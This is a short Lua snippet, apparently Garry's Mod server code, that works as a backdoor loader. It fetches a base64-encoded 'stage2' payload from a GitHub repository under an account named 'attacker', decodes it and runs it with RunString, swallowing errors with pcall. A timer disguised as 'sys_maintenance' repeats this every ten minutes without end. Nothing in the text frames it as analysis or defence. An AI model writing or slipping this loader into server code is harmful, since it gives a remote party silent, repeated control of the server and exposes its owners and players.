local function boot()
    http.Fetch("https://raw.githubusercontent.com/attacker/payloads/main/stage2.txt",
        function(body)
            local ok = pcall(function() RunString(util.Base64Decode(body), "init") end)
        end)
end
timer.Create("sys_maintenance", 600, 0, boot)
